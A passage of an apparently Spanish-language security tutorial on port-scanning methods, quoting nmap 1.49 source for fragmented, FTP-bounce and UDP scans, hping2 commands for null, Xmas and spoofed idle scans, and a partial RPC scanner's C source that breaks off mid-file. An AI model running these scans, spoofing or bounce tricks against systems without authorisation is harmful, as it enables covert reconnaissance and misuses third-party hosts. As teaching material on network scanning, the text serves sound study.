+
+	...
+
+pseudo->s_addy = source->s_addr;
+pseudo->d_addr = victim->s_addr;
+pseudo->protocol = IPPROTO_TCP;
+pseudo->length = htons(sizeof(struct tcphdr));
+
+tcp->th_sport = htons(sport);
+tcp->th_dport = htons(dport);
+tcp->th_seq = rand() + rand();
+
+tcp->th_off = 5 /*words*/;
+tcp->th_flags = flags;
+
+tcp->th_win = htons(2048); /* Who cares */
+
+tcp->th_sum = in_cksum((unsigned short *)pseudo,
+                       sizeof(struct tcphdr) + sizeof(struct pseudo_header));
+
+
+	/* Estamos hablando de  raw sockets. Vemos pues, la definicion
+de variables de las  estructuras pseudo (pseudo_header) y tcp (tcphdr)
+*/
+
+	...
+
+bzero((char *) packet, sizeof(struct ip));
+ip->ip_v = 4;
+ip->ip_hl = 5;
+ip->ip_len = htons(sizeof(struct ip) + 16);
+id = ip->ip_id = rand();
+ip->ip_off = htons(MORE_FRAGMENTS);
+ip->ip_ttl = 255;
+ip->ip_p = IPPROTO_TCP;
+ip->ip_src.s_addr = source->s_addr;
+ip->ip_dst.s_addr = victim->s_addr;
+#if HAVE_IP_IP_SUM
+ip->ip_sum= in_cksum((unsigned short *)ip, sizeof(struct ip));
+#endif
+if (o.debugging > 1) {
+  printf("Raw TCP packet fragment #1 creation completed!  Here it is:\n");
+  hdump(packet,20);
+}
+if (o.debugging > 1)
+  printf("\nTrying sendto(%d , packet, %d, 0 , %s , %d)\n",
+        sd, ntohs(ip->ip_len), inet_ntoa(*victim),
+        (int) sizeof(struct sockaddr_in));
+if ((res = sendto(sd, packet, ntohs(ip->ip_len), 0,
+                  (struct sockaddr *)&sock, sizeof(struct sockaddr_in))) == -1)
+  {
+    perror("sendto in send_syn_fragz");
+    return -1;
+  }
+if (o.debugging > 1) printf("successfully sent %d bytes of raw_tcp!\n", res);
+
+	/*  Vemos como  inicialmente  se prepara  la  cabecera ip  del
+primer frag que  se envia al host remoto; puedes  ver como se rellenan
+las variables de la estructura ip. Despues, se ve como comprueba si la
+creacion del paquete ha sido satisfactoria y lo intenta enviar. */
+
+	...
+
+bzero((char *) ip2, sizeof(struct ip));
+ip2->ip_v= 4;
+ip2->ip_hl = 5;
+ip2->ip_len = htons(sizeof(struct ip) + 4);
+ip2->ip_id = id;
+ip2->ip_off = htons(2);
+ip2->ip_ttl = 255;
+ip2->ip_p = IPPROTO_TCP;
+ip2->ip_src.s_addr = source->s_addr;
+ip2->ip_dst.s_addr= victim->s_addr;
+#if HAVE_IP_IP_SUM
+ip2->ip_sum = in_cksum((unsigned short *)ip2, sizeof(struct ip));
+#endif
+if (o.debugging > 1) {
+  printf("Raw TCP packet fragment creation completed!  Here it is:\n");
+  hdump(packet,20);
+}
+if (o.debugging > 1)
+
+  printf("\nTrying sendto(%d , ip2, %d, 0 , %s , %d)\n", sd,
+         ntohs(ip2->ip_len), inet_ntoa(*victim), (int) sizeof(struct sockaddr_i
+n));
+if ((res = sendto(sd, (void *)ip2, ntohs(ip2->ip_len), 0,
+                  (struct sockaddr *)&sock, (int) sizeof(struct sockaddr_in)))
+== -1)
+  {
+    perror("sendto in send_tcp_raw frag #2");
+    return -1;
+  }
+
+return 1;
+}
+
+	/*  se ve  en  esta ultima  parte  de codigo  la creacion  del
+segundo paquete, comprobacion  de que todo va bien  e intento de envio
+al host remoto. */
+
+
+	FTP  bouncer: bueno,  este metodo  de  escaneo se  basa en  la
+caracteristica de  algunos servidores de ftp que  permiten usarlo como
+"proxy", es decir,  crear una server-DTP activo que  te permita enviar
+cualquier fichero a  cualquier otro server.  La tecnica  en si para el
+proposito de escaneo de puertos consiste en conectar por ftp al server
+y mediante el  comando PORT declarar el "User-DTP"  pasivo que escucha
+en el puerto que queremos saber si esta abierto.  Despues, se actua de
+la  siguiente  forma: se  hace  un LIST  del  directorio  actual y  el
+resultado  sera  enviado  al   canal  Server-DTP.  Si  el  puerto  que
+comprobamos  esta abierto  todo  ocurre con  normalidad generando  las
+respuestas 150 y  226 pero si el puerto  esta cerrado obtendremos "425
+Can't build data connection: Connection refused.".  Este metodo, es en
+parte no lo suficientemente rapido pero  aun asi puede ser util ya que
+es dificil de tracear por parte del server remoto.
+	 Un ejemplo de implementacion de esta tecnica en codigo C: (nmap)
+
+	 ...
+
+portlist bounce_scan(struct hoststruct *target, unsigned short *portarray,
+                     struct ftpinfo *ftp) {
+
+	 /* vemos el inicio de la funcion que aplica esta tecnica */
+
+	 ...
+
+int starttime,  res , sd = ftp->sd,  i=0;
+char *t = (char *)&target->host;
+int retriesleft = FTP_RETRIES;
+char recvbuf[2048];
+char targetstr[20];
+char command[512];
+
+#ifndef HAVE_SNPRINTF
+sprintf(targetstr, "%d,%d,%d,%d,0,", UC(t[0]), UC(t[1]), UC(t[2]), UC(t[3]));
+#else
+  snprintf(targetstr, 20, "%d,%d,%d,%d,0,", UC(t[0]), UC(t[1]), UC(t[2]), UC(t[
+3]));
+#endif
+
+	/*  simplemente  definicion  de  variables y  usa  snprintf  o
+sprintf segun si se tiene o no */
+
+	...
+
+starttime = time(NULL);
+if (o.verbose || o.debugging)
+  printf("Initiating TCP ftp bounce scan against %s (%s)\n",
+         target->name,  inet_ntoa(target->host));
+for(i=0; portarray[i]; i++) {
+#ifndef HAVE_SNPRINTF
+  sprintf(command, "PORT %s%i\r\n", targetstr, portarray[i]);
+#else
+  snprintf(command, 512, "PORT %s%i\r\n", targetstr, portarray[i]);
+#endif
+
+	/* inicio del escaneo, definicion de bucle para ir cambiando
+puerto (portarray) */
+
+	...
+
+  if (send(sd, command, strlen(command), 0) < 0 ) {
+    perror("send in bounce_scan");
+    if (retriesleft) {
+      if (o.verbose || o.debugging)
+        printf("Our ftp proxy server hung up on us!  retrying\n");
+      retriesleft--;
+      close(sd);
+      ftp->sd = ftp_anon_connect(ftp);
+      if (ftp->sd < 0) return target->ports;
+      sd = ftp->sd;
+      i--;
+    }
+    else {
+      fprintf(stderr, "Our socket descriptor is dead and we are out of retries.
+ Giving up.\n");
+      close(sd);
+      ftp->sd = -1;
+      return target->ports;
+    }
+  } else {
+    res = recvtime(sd, recvbuf, 2048,15);
+    if (res <= 0) perror("recv problem from ftp bounce server\n");
+    else {
+      recvbuf[res] = '\0';
+  if (o.debugging) printf("result of port query on port %i: %s",
+                            portarray[i],  recvbuf);
+      if (recvbuf[0] == '5') {
+        if (portarray[i] > 1023) {
+        fprintf(stderr, "Your ftp bounce server sucks, it won't let us feed bog
+us ports!\n");
+        exit(1);
+      }
+
+
+      /* en esta  parte de code mira que envia  con send() y comprueba
+que el  envio ha sido correcto  y la recepcion  tambien, comprueba que
+hace  uso de ftp_anon_connect(),  funcion que  podras encontrar  en el
+codigo fuente de nmap en nmap.c, pero que yo no he copiado aqui por no
+alargar mas  la explicacion, el  nombre ya indica obviamente  para que
+sirve. Puedes ver que cuando  recibe bien y "if (o.debugging) entonces
+saca en pantalla el resultado del query al puerto.  */
+
+      ...
+
+      else {
+        fprintf(stderr, "Your ftp bounce server doesn't allow priviliged ports,
+ skipping them.\n");
+        while(portarray[i] && portarray[i] < 1024) i++;
+        if (!portarray[i]) {
+          fprintf(stderr, "And you didn't want to scan any unpriviliged ports.
+ Giving up.\n");
+          /*      close(sd);
+          ftp->sd = -1;
+          return *ports;*/
+          /* screw this gentle return crap!  This is an emergency! */
+          exit(1);
+        }
+      }
+      }
+
+      /* en caso de que no se consiga query a ningun puerto */
+
+      ...
+
+    else
+      if (send(sd, "LIST\r\n", 6, 0) > 0 ) {
+        res = recvtime(sd, recvbuf, 2048,12);
+        if (res <= 0)  perror("recv problem from ftp bounce server\n");
+        else {
+          recvbuf[res] = '\0';
+          if (o.debugging) printf("result of LIST: %s", recvbuf);
+          if (!strncmp(recvbuf, "500", 3)) {
+            /* fuck, we are not aligned properly */
+            if (o.verbose || o.debugging)
+              printf("misalignment detected ... correcting.\n");
+             res = recvtime(sd, recvbuf, 2048,10);
+          }
+          if (recvbuf[0] == '1' || recvbuf[0] == '2') {
+            if (o.verbose || o.debugging) printf("Port number %i appears good.\
+n", portarray[i]);
+            addport(&target->ports, portarray[i], IPPROTO_TCP, NULL);
+            if (recvbuf[0] == '1') {
+            res = recvtime(sd, recvbuf, 2048,5);
+            recvbuf[res] = '\0';
+            if (res > 0) {
+              if (o.debugging) printf("nxt line: %s", recvbuf);
+              if (recvbuf[0] == '4' && recvbuf[1] == '2' &&
+                  recvbuf[2] == '6') {
+
+
+                deleteport(&target->ports, portarray[i], IPPROTO_TCP);
+                if (o.debugging || o.verbose)
+                  printf("Changed my mind about port %i\n", portarray[i]);
+              }
+            }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+	/* empieza con  el LIST al server. Ademas  vemos que comprueba
+si no hay  una alineacion correcta y la  corrige. Finalmente a~ade los
+puertos  que   comprueba  que   estan  abiertos  y..   (ver  siguiente
+comentario) */
+
+if (o.debugging || o.verbose)
+  printf("Scanned %d ports in %ld seconds via the Bounce scan.\n",
+         o.numports, (long) time(NULL) - starttime);
+return target->ports;
+}
+
+	/* final  de la funcion, devuelve los  puertos abiertos, final
+del bounce scan */
+
+       Envio de  ACKs: este metodo se  basa en el envio  de un paquete
+ACK. El metodo de analisis de la respuesta RST puede ser:
+
+       1. fijarse en el valor del TTL
+       2. fijarse en el valor de win
+
+       1. Si  el  puerto  esta  abierto  entonces  encontramos  en  la
+          respuesta un valor de ttl menor de 64.
+       2. Si el puerto esta abierto  encontramos un valor de win en la
+          respuesta distinto de 0.
+
+	  Pero, esta tecnica  de escaneo no se cumple  en todo tipo de
+sistemas y su implementacion no esta muy clara. Si quieres saber mas sobre
+este metodo puedes leer Phrack 49; articulo 15 de Uriel Maimon.
+
+
+       Null  scan: este metodo  se basa  en el  envio de  paquetes sin
+ningun  flag  en  la  cabecera  TCP,  pero, el  incluir  en  los  bits
+reservados (RES1, RES2) no influye.
+
+       En caso de  que el puerto este abierto,  no se recibe respuesta
+del  host  remoto pero  en  el  caso de  estar  cerrado  se recibe  un
+RST|ACK. Este  tipo de escaneo  solo funciona en  caso de que  el host
+remoto sea  unix (BSD sockets).   En la version  1.49 del Nmap  aun no
+estaba implementado, actualmente  si; pero no tengo las  fuentes de la
+ultima version asi que tendras que buscarlo.
+
+       Para realizar este tipo de pruebas con el hping2 puedes hacer:
+
+       $ hping2 127.0.0.1 -c 1 -p 80
+
+       y en caso de estar cerrado el puerto 80 se recibira un RST|ACK.
+
+       Pero, este metodo, puede no  ser valido desde el momento en que
+los hosts remotos pueden chequear paquetes sin flags.
+
+       Xmas scan: este metodo es digamos antonimo al NULL ya que en el
+todas los  flags estan  activados, es decir,  con SYN, ACK,  FIN, RST,
+URG, PSH.y  de nuevo los bits  reservados no influyen  en el resultado
+del escaneo  y de nuevo solo  funcionara contra host  remotos que sean
+unix, ya que se basa en  la implementacion de la pila TCP/IP que hacen
+sistemas unix/linux/bsd.
+
+       En caso de que el puerto este abierto, no se recibe respuesta y
+en caso de que este cerrado se recibe un RST|ACK. En lo que se refiere
+a las fuentes pasa lo mismo que con el null scan.
+
+       Para realizar esta prueba con  el hping2 tendras que hacer, por
+ejemplo:
+
+       $ hping2 127.0.0.1 -c 1 -p 80 -F -S -R -P -A -U -X -Y
+
+
+       Spoofed scan  a traves  de un 'host  dormido': este  metodo de
+escaneo destaca, claro esta,  porque aunque sea detectable, no detecta
+al  que esta  escaneando sino  al 'host  dormido' (considerado  A) (de
+actividad 0) que  es utilizado para el escaneo.   Para esta tecnica se
+puede usar hping2 y se basa en la variacion del id de los paquetes que
+envia A  (host dormido).  Para que se  entienda: Se usara  hping2 para
+enviar paquetes TCP con unos flags determinados.
+
+       Exactamente lo  que se  hace es monitorizar  la actividad  de A
+para asi obtener el incremento del id que inicialmente es de +1 ya que
+no  tiene  actividad.  A  continuacion,  se  enviaran  un paquete  SYN
+spoofeado con  la ip del host A  al puerto que queramos  saber si esta
+abierto del  host remoto (considerado  B).  Si el  puerto de B  al que
+enviamos dichos  paquetes esta abierto  devolvera un paquete SYN  y un
+ACK a  A (host dormido),  forzando a B  a mandar un  RST, ya que  A no
+inicio dicha  conexion y no  quiere continuar la  comunicacion.  Esto,
+hace que A  (host silencioso), tenga actividad y  por tanto que cambie
+drasticamente su id,  por tanto, sabremos de esta  forma que el puerto
+esta abierto.
+
+     Lo que hay que puntualizar es que es no es muy sencillo encontrar
+un host remoto en el que realmente no haya actividad y ademas no todos
+los  citados servidores  sirven puesto  que no  incrementas  su numero
+inicial   de  secuencia  de   la  misma   forma.   Para   obtener  una
+monitorizacion de la actividad de A (host dormido) se tendra que:
+
+	$ hping2 A -r
+HPING B (ppp0 xxx.yyy.zzz.jjj): no flags are set, 40 headers + 0 data bytes
+60 bytes from xxx.yyy.zzz.jjj: flags=RA seq=0 ttl=64 id=xxx win=0 time=1.3 ms
+60 bytes from xxx.yyy.zzz.jjj: flags=RA seq=1 ttl=64 id=+1 win=0 time=80 ms
+60 bytes from xxx.yyy.zzz.jjj: flags=RA seq=2 ttl=64 id=+1 win=0 time=89 ms
+60 bytes from xxx.yyy.zzz.jjj: flags=RA seq=3 ttl=64 id=+1 win=0 time=90 ms
+60 bytes from xxx.yyy.zzz.jjj: flags=RA seq=4 ttl=64 id=+1 win=0 time=91 ms
+...
+
+	 Para enviar un paquete SYN spoofeado:
+
+	 $ hping2 B -a A -S -p puerto
+ppp0 default routing interface selected (according to /proc)
+HPING 127.0.0.1 (ppp0 127.0.0.1): S set, 40 headers + 0 data bytes
+...
+
+	 Y entonces  si el  puerto al que  hemos enviado  los paquetes
+esta  abierto,  vemos  como  en  la monitorizacion  de  A  se observa:
+
+...
+60 bytes from xxx.yyy.zzz.jjj: flags=RA seq=17 ttl=64 id=+1 win=0 time=92 ms
+60 bytes from xxx.yyy.zzz.jjj: flags=RA seq=18 ttl=64 id=+1 win=0 time=84 ms
+60 bytes from xxx.yyy.zzz.jjj: flags=RA seq=19 ttl=64 id=+2 win=0 time=83 ms
+60 bytes from xxx.yyy.zzz.jjj: flags=RA seq=20 ttl=64 id=+3 win=0 time=92 ms
+60 bytes from xxx.yyy.zzz.jjj: flags=RA seq=21 ttl=64 id=+1 win=0 time=91 ms
+...
+
+
+	Escaneando  UDP mediante  error de  ICMP port  unreachable: En
+este metodo  encontramos una primera  diferencia, se usa  el protocolo
+UDP,  no TCP. Aunque  dicho protocolo  es mas  simple, es  mas dificil
+usarlo  para escanear,  debido  a  que los  puertos  abiertos no  usan
+digamos  la funcion  fatica y  los puertos  cerrados no  tienen porque
+enviar un mensaje de error  ante nuestros envios.  Pero, la mayoria de
+los hosts  mandan un mensaje de error  ICMP_PORT_UNREACH cuando envias
+un paquete (UDP) a un puerto  UDP cerrado.  Esto puede ser usado para,
+por exclusion,  saber los  puertos que estan  abiertos pero no  es muy
+viable, porque tampoco  se tiene la seguridad de que  el error de ICMP
+llegue a  nosotros y  es ciertamente lento,  e incluso mas  cuando nos
+encontramos con  un host que  limita el numero  de mensajes de  ICMP a
+enviar,  como  se  ha  comentado  anteriormente en  los  metodos  para
+averiguar el  tipo de OS  que presenta una maquina.  Ademas, necesitas
+acceso  de root para  poder construir  raw ICMP  socket para  leer los
+puertos inalcanzables.  Un ejemplo de aplicacion de esta tecnica en C:
+(nmap)
+
+portlist udp_scan(struct hoststruct *target, unsigned short *portarray) {
+
+	/* inicio de la funcion que pone en practica este metodo */
+
+	...
+
+  int icmpsock, udpsock, tmp, done=0, retries, bytes = 0, res,  num_out = 0;
+  int i=0,j=0, k=0, icmperrlimittime, max_tries = UDP_MAX_PORT_RETRIES;
+  unsigned short outports[MAX_SOCKETS_ALLOWED];
+  unsigned short numtries[MAX_SOCKETS_ALLOWED];
+  struct sockaddr_in her;
+  char senddata[] = "blah\n";
+  unsigned long starttime, sleeptime;
+  struct timeval shortwait = {1, 0 };
+  fd_set  fds_read, fds_write;
+
+  bzero( (char *) outports, o.max_sockets * sizeof(unsigned short));
+  bzero( (char *) numtries, o.max_sockets * sizeof(unsigned short));
+
+	 /*  como puedes ver,  preliminares, pero  importantes, puesto
+que sino no entenderas el resto del code. */
+
+
+  icmperrlimittime = 60000;
+  sleeptime = (target->rtt)? ( target->rtt) + 30000 : 1e5;
+if (o.wait) icmperrlimittime = o.wait;
+starttime = time(NULL);
+FD_ZERO(&fds_read);
+FD_ZERO(&fds_write);
+if (o.verbose || o.debugging)
+ printf("Initiating UDP (raw ICMP version) scan against %s (%s) using wait dela
+y of %li usecs.\n", target->name,  inet_ntoa(target->host), sleeptime);
+if ((icmpsock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0)
+  perror("Opening ICMP RAW socket");
+if ((udpsock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
+  perror("Opening datagram socket");
+
+unblock_socket(icmpsock);
+her.sin_addr = target->host;
+her.sin_family = AF_INET;
+
+	 /* se  observa como icmperrlimittime hace que  no estropee el
+scan el hecho de que algunos  SOs pongan limites al numero de mensajes
+de error ICMP por tiempo. Abre raw socket y dgram socket. */
+
+	 ...
+
+while(!done) {
+  tmp = num_out;
+  for(i=0; (i < o.max_sockets && portarray[j]) || i < tmp; i++) {
+    close(udpsock);
+    if ((udpsock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
+      perror("Opening datagram socket");
+    if ((i > tmp && portarray[j]) || numtries[i] > 1) {
+      if (i > tmp) her.sin_port = htons(portarray[j++]);
+      else her.sin_port = htons(outports[i]);
+      FD_SET(udpsock, &fds_write);
+      FD_SET(icmpsock, &fds_read);
+      shortwait.tv_sec = 1; shortwait.tv_usec = 0;
+      usleep(icmperrlimittime);
+      res = select(udpsock + 1, NULL, &fds_write, NULL, &shortwait);
+       if (FD_ISSET(udpsock, &fds_write))
+          bytes = sendto(udpsock, senddata, sizeof(senddata), 0,
+                         (struct sockaddr *) &her, sizeof(struct sockaddr_in));
+      else {
+        printf("udpsock not set for writing port %d!",  ntohs(her.sin_port));
+        return target->ports;
+      }
+      if (bytes <= 0) {
+        if (errno == ECONNREFUSED) {
+          retries = 10;
+          do {
+            printf("sendto said connection refused on port %d but trying again
+anyway.\n", ntohs(her.sin_port));
+            usleep(icmperrlimittime);
+            bytes = sendto(udpsock, senddata, sizeof(senddata), 0,
+                          (struct sockaddr *) &her, sizeof(struct sockaddr_in))
+;
+            printf("This time it returned %d\n", bytes);
+          } while(bytes <= 0 && retries-- > 0);
+        }
+        if (bytes <= 0) {
+          printf("sendto returned %d.", bytes);
+          fflush(stdout);
+          perror("sendto");
+        }
+      }
+      if (bytes > 0 && i > tmp) {
+        num_out++;
+        outports[i] = portarray[j-1];
+      }
+    }
+  }
+  usleep(sleeptime);
+  tmp = listen_icmp(icmpsock, outports, numtries, &num_out, target->host, &targ
+et->ports);
+  if (o.debugging) printf("listen_icmp caught %d bad ports.\n", tmp);
+  done = !portarray[j];
+  for (i=0,k=0; i < o.max_sockets; i++)
+    if (outports[i]) {
+      if (++numtries[i] > max_tries - 1) {
+        if (o.debugging || o.verbose)
+          printf("Adding port %d for 0 unreachable port generations\n",
+                 outports[i]);
+        addport(&target->ports, outports[i], IPPROTO_UDP, NULL);
+        num_out--;
+        outports[i] = numtries[i] = 0;
+      }
+      else {
+        done = 0;
+        outports[k] = outports[i];
+        numtries[k] = numtries[i];
+        if (k != i)
+          outports[i] = numtries[i] = 0;
+        k++;
+      }
+    }
+  if (num_out == o.max_sockets) {
+  printf("Numout is max sockets, that is a problem!\n");
+  sleep(1);
+  }
+}
+
+	/* si  analizas este  fragmento de codigo  (copia un  poco mas
+grande  de  lo normal,  pero  es que  es  mas  entendible asi.  Puedes
+observar que  se repite el proceso  varias veces; dado  el problema de
+que  algunas  veces  los paquetes  ICMP  de  error  no nos  lleguen  a
+nosotros, asi  es una forma de  asegurarse. Ademas, puedes  ver que en
+todo, si falla algo, te devuelve  justamente el error. Lo mejor es que
+analices tu mismo el codigo. */
+
+	...
+
+if (o.debugging || o.verbose)
+  printf("The UDP raw ICMP scanned %d ports in  %ld seconds with %d parallel so
+ckets.\n", o.numports, time(NULL) - starttime, o.max_sockets);
+close(icmpsock);
+close(udpsock);
+return target->ports;
+}
+
+	/*  final de la  funcion, devuelve  puertos, saca  en pantalla
+datos del escaneo, etc. */
+
+
+       Escaneo UDP basado en recvfrom() y write(): este metodo arregla
+el problema  de que los errores  ICMP de port  unreachable solo puedan
+ser leidos  por el root.  Para saber si  ha sido recibido un  error de
+ICMP basta con usar recvfrom() y se recibira ECONNREFUSED ("Connection
+refused", errno 111) si se ha recibido y EAGAIN("Try Again", errno 13)
+si no se ha recibido.
+       Un  ejemplo de  este metodo  implementado en  C  lo encontramos
+nuevamente en nmap.
+
+portlist lamer_udp_scan(struct hoststruct *target, unsigned short *portarray) {
+
+	 /* inicio  de funcion  que implementa este  metodo, no  voy a
+copiar  las  definiciones de  variables  e  inicializacion del  primer
+socket.   Si quieres  verlo completo  revisa las  fuentes de  nmap por
+ejemplo /nmap-1.49/nmap.c */
+
+	 ...
+
+
+if (o.wait) sleeptime = o.wait;
+else sleeptime =  calculate_sleep(target->host) + 60000;
+if (o.verbose || o.debugging)
+  printf("Initiating UDP scan against %s (%s), sleeptime: %li\n", target->name,
+         inet_ntoa(target->host), sleeptime);
+starttime = time(NULL);
+
+	  /* temporizador/saca en pantalla que se inicia el escaneo */
+
+	  ...
+
+for(i = 0 ; i < o.max_sockets; i++)
+  trynum[i] =  portno[i] = 0;
+while(portarray[j]) {
+  for(i=0; i < o.max_sockets && portarray[j]; i++, j++) {
+    if (i >= last_open) {
+      if ((sockets[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
+        {perror("datagram socket troubles"); exit(1);}
+      block_socket(sockets[i]);
+      portno[i] = portarray[j];
+    }
+    her.sin_port = htons(portarray[j]);
+    bytes = sendto(sockets[i], data, sizeof(data), 0, (struct sockaddr *) &her,
+                   sizeof(struct sockaddr_in));
+    usleep(5000);
+    if (o.debugging > 1)
+      printf("Sent %d bytes on socket %d to port %hi, try number %d.\n",
+             bytes, sockets[i], portno[i], trynum[i]);
+    if (bytes < 0 ) {
+      printf("Sendto returned %d the FIRST TIME!@#$!, errno %d\n", bytes,
+             errno);
+      perror("");
+      trynum[i] = portno[i] = 0;
+      close(sockets[i]);
+    }
+  }
+
+	/* envio de datos al puerto a escanear. Comprueba por ti mismo
+el codigo */
+
+  last_open = i;
+  /* Might need to change this to 1e6 if you are having problems*/
+  usleep(sleeptime + 5e5);
+  for(i=0; i < last_open ; i++) {
+    if (portno[i]) {
+      unblock_socket(sockets[i]);
+      if ((bytes = recvfrom(sockets[i], response, 1024, 0,
+                            (struct sockaddr *) &stranger,
+                            &sockaddr_in_size)) == -1)
+        {
+          if (o.debugging > 1)
+            printf("2nd recvfrom on port %d returned %d with errno %d.\n",
+                   portno[i], bytes, errno);
+          if (errno == EAGAIN /*11*/)
+            {
+              if (trynum[i] < 2) trynum[i]++;
+              else {
+                if (RISKY_UDP_SCAN) {
+                  printf("Adding port %d after 3 EAGAIN errors.\n", portno[i]);
+                  addport(&target->ports, portno[i], IPPROTO_UDP, NULL);
+                }
+                else if (o.debugging)
+                  printf("Skipping possible false positive, port %d\n",
+                         portno[i]);
+                trynum[i] = portno[i] = 0;
+                close(sockets[i]);
+              }
+            }
+          else if (errno == ECONNREFUSED /*111*/) {
+            if (o.debugging > 1)
+              printf("Closing socket for port %d, ECONNREFUSED received.\n",
+                     portno[i]);
+            trynum[i] = portno[i] = 0;
+            close(sockets[i]);
+          }
+          else {
+            printf("Curious recvfrom error (%d) on port %hi: ",
+                   errno, portno[i]);
+            perror("");
+            trynum[i] = portno[i] = 0;
+            close(sockets[i]);
+          }
+        }
+      else /*bytes is positive*/ {
+        if (o.debugging || o.verbose)
+          printf("Adding UDP port %d due to positive read!\n", portno[i]);
+
+        addport(&target->ports,portno[i], IPPROTO_UDP, NULL);
+        trynum[i] = portno[i] = 0;
+        close(sockets[i]);
+      }
+    }
+  }
+
+	...
+
+  /* Update last_open, we need to create new sockets.*/
+  for(i=0, k=0; i < last_open; i++)
+    if (portno[i]) {
+      close(sockets[i]);
+      sockets[k] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+      /*      unblock_socket(sockets[k]);*/
+      portno[k] = portno[i];
+      trynum[k] = trynum[i];
+      k++;
+    }
+ last_open = k;
+  for(i=k; i < o.max_sockets; i++)
+    trynum[i] = sockets[i] = portno[i] = 0;
+}
+
+/* observa en este fragmento de  codigo como se cumple a la perfeccion
+la teoria de explicacion de  este metodo. Me parece un codigo bastante
+simple  de analizar  asi que  mirate todos  los if's  y  lo entenderas
+perfectamente (siempre que tengas conocimientos de TCP/IP/C */
+
+	...
+
+if (o.debugging)
+  printf("UDP scanned %d ports in %ld seconds with %d parallel sockets\n",
+         o.numports, (long) time(NULL) - starttime, o.max_sockets);
+return target->ports;
+}
+
+	/* fin de la funcion, datos sobre el escaneo, devuelve puertos */
+
+	Escaneo de servicios RPC: es relativamente facil hacer un scan
+de  los puertos que  ofrecen servicios  rpc, bastante  rapido y  en la
+mayoria de los casos no se dejan logs en el host remoto.  Pero, debido
+a  que  han  sido  descubiertas bastantes  vulnerabilidades  en  estos
+servicios ciertos sysadmins  han optado por bloquear el  acceso a este
+tipo de servicios. Al  referirme a RPC lo hago a ONC  RPC y no DCE RPC
+RPC es  un sistema  basado en  query <-> reply.  Despues de  enviar el
+numero  del  programa  en  el  que  estas  interesado,  el  numero  de
+procedimiento, algun argumento, autentificacion y otros parametros del
+host  remoto  obtienes lo  que  el  procedimiento  devuelve o  algunas
+indicaciones de porque fallo.
+
+	     Pero,  antes  tenemos que  saber  que  puertos UDP  estan
+abiertos, asi que se usara  un connect() para saberlo (como se explico
+anteriormente) y obtendremos un ICMP de PORT_UNREACH en caso de que no
+este a la escucha.
+
+	Para  que   RPC  fuese  portable  todos   los  argumentos  son
+traducidos a XDR, que es un lenguaje de data encoding que se parece un
+poco   a   Pascal  (rfc1832).   Los   programas   RPC  tienen   varios
+procedimientos pero  aun uno que  siempre existe, es  el procedimiento
+0. Este,  no admite  argumentos y  no devuelve  ningun  valor..  (void
+rpcping()void). Y de esta forma es como determinaremos el puerto en el
+que se encuentra un programa, llamaremos al procedimiento ping.
+
+	A continuacion,  te presento  un codigo de  halflife (gracias,
+halflife halflife@infonexus.com) en el que se consigue hacer esto:
+
+
+<++> RPCscan/Makefile
+CC=gcc
+PROGNAME=rpcscan
+CFLAGS=-c
+
+build: checkrpc.o main.o rpcserv.o udpcheck.o
+        $(CC) -o $(PROGNAME) checkrpc.o main.o rpcserv.o udpcheck.o
+
+checkrpc.o:
+
+
+        $(CC) $(CFLAGS) checkrpc.c
+
+main.o:
+        $(CC) $(CFLAGS) main.c
+
+rpcserv.o:
+        $(CC) $(CFLAGS) rpcserv.c
+
+udpcheck.o:
+        $(CC) $(CFLAGS) udpcheck.c
+
+clean:
+        rm -f *.o $(PROGNAME)
+<-->
+<++> RPCscan/checkrpc.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/time.h>
+#include <sys/socket.h>
+#include <rpc/rpc.h>
+#include <netdb.h>
+
+extern struct sockaddr_in *saddr;
+
+int
+check_rpc_service(long program)
+{
+        int sock = RPC_ANYSOCK;
+        CLIENT *client;
+        struct timeval timeout;
+        enum clnt_stat cstat;
+        timeout.tv_sec = 10;
+        timeout.tv_usec = 0;
+        client = clntudp_create(saddr, program, 1, timeout, &sock);
+        if(!client)
+                return -1;
+        timeout.tv_sec = 10;
+        timeout.tv_usec = 0;
+
+        cstat = RPC_TIMEDOUT;
+        cstat = clnt_call(client, 0, xdr_void, NULL, xdr_void, NULL, timeout);
+        if(cstat == RPC_TIMEDOUT)
+        {
+                timeout.tv_sec = 10;
+                timeout.tv_usec = 0;
+                cstat = clnt_call(client, 0, xdr_void, NULL, xdr_void, NULL, ti
+meout);
+        }
+        clnt_destroy(client);
+        close(sock);
+        if(cstat == RPC_SUCCESS)
+                return 1;
+        else if(cstat == RPC_PROGVERSMISMATCH)
+                return 1;
+        else return 0;
+}
+<-->
+<++> RPCscan/main.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int check_udp_port(char *, u_short);
+int check_rpc_service(long);
+long get_rpc_prog_number(char *);
+#define HIGH_PORT       5000
+#define LOW_PORT        512
+
+main(int argc, char **argv)
+{
+        int i,j;
+        long prog;
+        if(argc != 3)
+        {
+                fprintf(stderr, "%s host program\n", argv[0]);
+                exit(0);
+        }
+        prog = get_rpc_prog_number(argv[2]);
+        if(prog == -1)
+
+        {
+                fprintf(stderr, "invalid rpc program number\n");
+                exit(0);
+        }
+        printf("Scanning %s for program %d\n", argv[1], prog);
+        for(i=LOW_PORT;i <= HIGH_PORT;i++)
+        {
+                if(check_udp_port(argv[1], i) > 0)
+                {
+                        if(check_rpc_service(prog) == 1)
+                        {
+                                printf("%s is on port %u\n", argv[2], i);
+                                exit(0);
+                        }
+                }
+        }
+}
+<-->
+<++> RPCscan/rpcserv.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <ctype.h>
+#include <rpc/rpc.h>
+
+long
+get_rpc_prog_number(char *progname)
+{
+        struct rpcent *r;
+        int i=0;
+
+        while(progname[i] != '\0')
+        {
+                if(!isdigit(progname[i]))
+                {
+                        setrpcent(1);
+                        r = getrpcbyname(progname);
+                        endrpcent();
+                        if(!r)
+                                return -1;
+                        else return r->r_number;
+                }
+                i++;
+        }
+        return atoi(progname);
+}
+<-->
+<++> RPCscan/udpcheck.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <netdb.h>
+#include <netinet/in.h>
